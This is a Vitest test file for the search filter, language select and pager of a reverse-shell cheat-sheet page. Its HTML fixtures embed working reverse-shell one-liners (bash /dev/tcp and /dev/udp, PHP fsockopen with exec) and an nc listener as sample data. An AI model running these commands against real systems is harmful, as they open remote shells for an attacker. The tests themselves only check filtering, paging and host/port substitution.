// @vitest-environment jsdom
import { readFileSync } from 'node:fs';
import { beforeEach, describe, it, expect } from 'vitest';

// public/revshells-filter.js is a classic browser script (the package is "type": "module"), so it is evaluated rather than imported.
const src = readFileSync('public/revshells-filter.js', 'utf8');
const mod: { exports: Record<string, (...a: any[]) => any> } = { exports: {} }; // eslint-disable-line @typescript-eslint/no-explicit-any
const run = () => new Function('module', src)(mod);

const item = (name: string, cmd: string, off = false) =>
  `<div class="rs-item"${off ? ' data-off=""' : ''}><h3>${name}</h3><p class="note">Reverse shell for Linux and Windows.</p>${off ? '<p class="note shell-unavailable">Unavailable.</p>' : `<pre><code>${cmd}</code></pre>`}</div>`;
const FIXTURE = `<main id="main"><h1>Shells</h1>
<div class="tf rs-fill" id="rs-fill" hidden><div class="tf-controls"><div class="tf-field"><input id="rs-lhost" type="text" /></div><div class="tf-field"><input id="rs-lport" type="text" /></div></div></div>
<!--email_off-->
<section class="rs-lang" data-lang="bash" data-label="Bash" data-listener="nc -lvnp {LPORT}"><h2 id="bash">Bash reverse shells</h2><p class="note">Listener:</p><pre><code>nc -lvnp {LPORT}</code></pre>${item('Bash -i', 'bash -i &gt;&amp; /dev/tcp/{LHOST}/{LPORT} 0&gt;&amp;1')}${item('Bash UDP', 'sh -i &gt;&amp; /dev/udp/{LHOST}/{LPORT}')}</section>
<section class="rs-lang" data-lang="php" data-label="PHP"><h2 id="php">PHP reverse shells</h2>${item('PHP exec', 'php -r &#39;$sock=fsockopen("{LHOST}",{LPORT});exec("sh");&#39;')}</section>
<section class="rs-lang" data-lang="perl" data-label="Perl"><h2 id="perl">Perl reverse shells</h2>${item('Perl none', '', true)}</section>
<!--/email_off--></main>`;

const $ = <T extends Element>(s: string) => document.querySelector(s) as T;
const type = (el: HTMLInputElement, v: string) => {
  el.value = v;
  el.dispatchEvent(new Event('input', { bubbles: true }));
};
const choose = (el: HTMLSelectElement, v: string) => {
  el.value = v;
  el.dispatchEvent(new Event('change', { bubbles: true }));
};
const wait = (ms: number) => new Promise((r) => setTimeout(r, ms));
const visible = () => [...document.querySelectorAll<HTMLElement>('.rs-item')].filter((e) => !e.hidden).map((e) => e.querySelector('h3')?.textContent);

describe('revshells filter helpers', () => {
  it('normalizes case and whitespace', () => {
    run();
    expect(mod.exports.norm('  Nc   -E ')).toBe('nc -e');
    expect(mod.exports.norm(null)).toBe('');
  });

  it('matches every word of the query and the language', () => {
    run();
    const it1 = { hay: mod.exports.norm('Bash -i Reverse shell for Linux /dev/tcp'), lang: 'bash' };
    expect(mod.exports.matches(it1, { q: 'dev tcp', lang: '' })).toBe(true);
    expect(mod.exports.matches(it1, { q: 'dev udp', lang: '' })).toBe(false);
    expect(mod.exports.matches(it1, { q: '', lang: 'php' })).toBe(false);
    expect(mod.exports.matches(it1, { q: '', lang: 'bash' })).toBe(true);
  });
});

describe('revshells filter in the DOM', () => {
  beforeEach(() => {
    document.body.innerHTML = FIXTURE;
    run();
  });

  it('puts search, language and the count inside the LHOST bar, shows it, and counts shells that have a command', () => {
    expect(document.querySelectorAll('.rs-filter')).toHaveLength(1);
    expect($<HTMLElement>('#rs-fill').hidden).toBe(false);
    expect($('#rs-fill').classList.contains('rs-filter')).toBe(true);
    expect($('#rs-fill #rsf-q')).toBeTruthy();
    expect($('#rs-fill #rsf-lang')).toBeTruthy();
    expect($('#rs-fill .tf-count').textContent).toBe('Showing 3 of 3 shells');
    expect(document.querySelector('.chips')).toBeNull();
    expect(visible()).toHaveLength(4);
  });

  it('labels the language select from data-label', () => {
    expect([...document.querySelectorAll('#rsf-lang option')].map((o) => o.textContent)).toEqual(['All languages', 'Bash', 'PHP', 'Perl']);
  });

  it('hides the list heading from view and keeps it focusable', () => {
    const head = $('#rs-list-head');
    expect(head.classList.contains('sr-only')).toBe(true);
    expect(head.getAttribute('tabindex')).toBe('-1');
  });

  it('filters by language and hides the emptied sections', () => {
    choose($('#rsf-lang'), 'bash');
    expect(visible()).toEqual(['Bash -i', 'Bash UDP']);
    expect($('.tf-count').textContent).toBe('Showing 2 of 3 shells');
    expect($<HTMLElement>('section[data-lang="php"]').hidden).toBe(true);
    expect($<HTMLElement>('section[data-lang="bash"]').hidden).toBe(false);
  });

  it('finds shells by a listener printed once for their section', async () => {
    type($('#rsf-q'), 'nc -lvnp');
    await wait(160);
    expect(visible()).toEqual(['Bash -i', 'Bash UDP']);
  });

  it('searches names, notes and the command text', async () => {
    type($('#rsf-q'), 'fsockopen');
    await wait(160);
    expect(visible()).toEqual(['PHP exec']);
    type($('#rsf-q'), 'dev tcp');
    await wait(160);
    expect(visible()).toEqual(['Bash -i']);
  });

  it('shows an empty state, and Reset brings every shell back', async () => {
    type($('#rsf-q'), 'zzzzzz');
    await wait(160);
    expect($<HTMLElement>('.tf-empty').hidden).toBe(false);
    expect($('.tf-count').textContent).toBe('Showing 0 of 3 shells');
    $<HTMLButtonElement>('.tf-reset').click();
    expect($<HTMLElement>('.tf-empty').hidden).toBe(true);
    expect(visible()).toHaveLength(4);
    expect($<HTMLInputElement>('#rsf-q').value).toBe('');
  });
});

describe('revshells paging helpers', () => {
  it('pageSlice clamps the page and reports the range', () => {
    run();
    expect(mod.exports.pageSlice(48, 1, 20)).toEqual({ page: 1, pages: 3, start: 1, end: 20 });
    expect(mod.exports.pageSlice(48, 3, 20)).toEqual({ page: 3, pages: 3, start: 41, end: 48 });
    expect(mod.exports.pageSlice(48, 99, 20).page).toBe(3);
    expect(mod.exports.pageSlice(48, 0, 20).page).toBe(1);
    expect(mod.exports.pageSlice(48, 'x', 20).page).toBe(1);
    expect(mod.exports.pageSlice(0, 1, 20)).toEqual({ page: 1, pages: 1, start: 0, end: 0 });
    expect(mod.exports.pageSlice(20, 1, 20).pages).toBe(1);
    expect(mod.exports.pageSlice(21, 1, 20).pages).toBe(2);
  });

  it('pageOf and rangeText', () => {
    run();
    expect(mod.exports.pageOf(0, 20)).toBe(1);
    expect(mod.exports.pageOf(19, 20)).toBe(1);
    expect(mod.exports.pageOf(20, 20)).toBe(2);
    expect(mod.exports.rangeText(21, 40, 48)).toBe('Showing 21-40 of 48 shells');
    expect(mod.exports.PAGE_SIZE).toBe(20);
  });
});

// 25 + 22 + 1 = 48 shells with a command (3 pages of 20), plus one "Unavailable" entry placed after the 20th shell of language "a".
const many = (lang: string, label: string, n: number, extra = '') =>
  `<section class="rs-lang" data-lang="${lang}" data-label="${label}"><h2 id="${lang}">${label} reverse shells</h2>${Array.from({ length: n }, (_, i) => item(`${lang}-${i}`, `run ${lang}${i} {LHOST} {LPORT}`) + (extra && i === 19 ? extra : '')).join('')}</section>`;
const PAGED = `<main id="main"><h1>Shells</h1>
<div class="tf rs-fill" id="rs-fill" hidden><input id="rs-lhost" type="text" /><input id="rs-lport" type="text" /></div>
<!--email_off-->${many('a', 'A', 25, item('a-off', '', true))}${many('b', 'B', 22)}${many('c', 'C', 1)}<!--/email_off--></main>`;
const ccSrc = readFileSync('public/copy-code.js', 'utf8');
const names = () => visible();
const h2 = (id: string) => document.getElementById(id)?.textContent;
const pagerLabels = () => [...document.querySelectorAll('.rs-pager-label')].map((e) => e.textContent);
const clickNext = () => document.querySelectorAll<HTMLButtonElement>('.rs-pager button')[1].click();
const clickPrev = () => document.querySelectorAll<HTMLButtonElement>('.rs-pager button')[0].click();

describe('revshells paging in the DOM', () => {
  const boot = (url = '/revshells/') => {
    history.replaceState(null, '', url);
    document.body.innerHTML = PAGED;
    run();
  };
  beforeEach(() => boot());

  it('shows 20 shells per page with a pager above and below, Previous disabled on page 1', () => {
    expect(visible().filter((n) => n !== 'a-off')).toHaveLength(20);
    expect($('.tf-count').textContent).toBe('Showing 1-20 of 48 shells');
    expect(document.querySelectorAll('.rs-pager')).toHaveLength(2);
    expect(pagerLabels()).toEqual(['Page 1 of 3', 'Page 1 of 3']);
    const [prev, next] = document.querySelectorAll<HTMLButtonElement>('.rs-pager button');
    expect(prev.disabled).toBe(true);
    expect(next.disabled).toBe(false);
    expect($<HTMLElement>('.rs-pager').hidden).toBe(false);
  });

  it('keeps an Unavailable entry visible without counting it or giving it a slot', () => {
    expect(names()).toContain('a-off');
    expect(names()).toContain('a-19');
    expect(names()).not.toContain('a-20');
    expect($('.tf-count').textContent).toContain('1-20 of 48');
  });

  it('Next and Previous move between pages and repeat the language heading as "(continued)" in place', () => {
    expect(h2('a')).toBe('A reverse shells');
    clickNext();
    expect(names()[0]).toBe('a-20');
    expect(names()).not.toContain('a-off');
    expect(h2('a')).toBe('A reverse shells (continued)');
    expect(h2('b')).toBe('B reverse shells');
    expect($('.tf-count').textContent).toBe('Showing 21-40 of 48 shells');
    clickNext();
    expect(h2('b')).toBe('B reverse shells (continued)');
    expect(names()).toContain('c-0');
    const next = document.querySelectorAll<HTMLButtonElement>('.rs-pager button')[1];
    expect(next.disabled).toBe(true);
    expect($('.tf-count').textContent).toBe('Showing 41-48 of 48 shells');
    clickPrev();
    clickPrev();
    expect(h2('a')).toBe('A reverse shells');
    expect(document.querySelectorAll('#a')).toHaveLength(1);
    expect(document.querySelectorAll('[id]').length).toBe(new Set([...document.querySelectorAll('[id]')].map((e) => e.id)).size);
  });

  it('moves focus to the list heading after a page change', () => {
    clickNext();
    expect(document.activeElement?.id).toBe('rs-list-head');
    expect(document.getElementById('rs-list-head')?.getAttribute('tabindex')).toBe('-1');
  });

  it('writes ?page=N with replaceState only while no filter is active', async () => {
    const len = history.length;
    clickNext();
    expect(location.search).toBe('?page=2');
    expect(history.length).toBe(len);
    choose($('#rsf-lang'), 'b');
    expect(location.search).toBe('');
    choose($('#rsf-lang'), '');
    clickNext();
    clickPrev();
    expect(location.search).toBe('');
  });

  it('search, language, Reset and Clear all go back to page 1', async () => {
    clickNext();
    type($('#rsf-q'), 'run');
    await wait(160);
    expect(pagerLabels()[0]).toBe('Page 1 of 3');
    clickNext();
    choose($('#rsf-lang'), 'a');
    expect(pagerLabels()[0]).toBe('Page 1 of 2');
    clickNext();
    $<HTMLButtonElement>('.tf-reset').click();
    expect(pagerLabels()[0]).toBe('Page 1 of 3');
    clickNext();
    type($('#rsf-q'), 'zzzzzz');
    await wait(160);
    $<HTMLButtonElement>('.tf-empty button').click();
    expect(pagerLabels()[0]).toBe('Page 1 of 3');
  });

  it('search and language span every page', async () => {
    type($('#rsf-q'), 'c0');
    await wait(160);
    expect(names()).toEqual(['c-0']);
    expect($('.tf-count').textContent).toBe('Showing 1 of 48 shells');
    expect($<HTMLElement>('.rs-pager').hidden).toBe(true);
  });

  it('hides the pager when everything fits on one page', () => {
    document.body.innerHTML = FIXTURE;
    run();
    expect([...document.querySelectorAll<HTMLElement>('.rs-pager')].every((p) => p.hidden)).toBe(true);
    expect(visible()).toHaveLength(4);
  });

  it('reacts to hashchange after load', async () => {
    location.hash = '#c';
    await wait(30);
    expect(pagerLabels()[0]).toBe('Page 3 of 3');
    expect(names()).toContain('c-0');
  });

  it('opens ?page=N on load, clamps an out-of-range page, and lets an outside #lang hash win', () => {
    boot('/revshells/?page=2');
    expect(pagerLabels()[0]).toBe('Page 2 of 3');
    boot('/revshells/?page=99');
    expect(pagerLabels()[0]).toBe('Page 3 of 3');
    boot('/revshells/?page=abc');
    expect(pagerLabels()[0]).toBe('Page 1 of 3');
    boot('/revshells/?page=1#c');
    expect(pagerLabels()[0]).toBe('Page 3 of 3');
    expect(names()).toContain('c-0');
    history.replaceState(null, '', '/revshells/');
  });

  it('fills LHOST and LPORT into shells on later pages once they show', () => {
    new Function(ccSrc)();
    const lhost = $<HTMLInputElement>('#rs-lhost');
    const lport = $<HTMLInputElement>('#rs-lport');
    lhost.value = '10.0.0.1';
    lhost.dispatchEvent(new Event('input', { bubbles: true }));
    lport.value = '4444';
    lport.dispatchEvent(new Event('input', { bubbles: true }));
    clickNext();
    clickNext();
    const code = [...document.querySelectorAll<HTMLElement>('.rs-item:not([hidden]) code')].map((c) => c.textContent);
    expect(code).toContain('run c0 10.0.0.1 4444');
  });
});
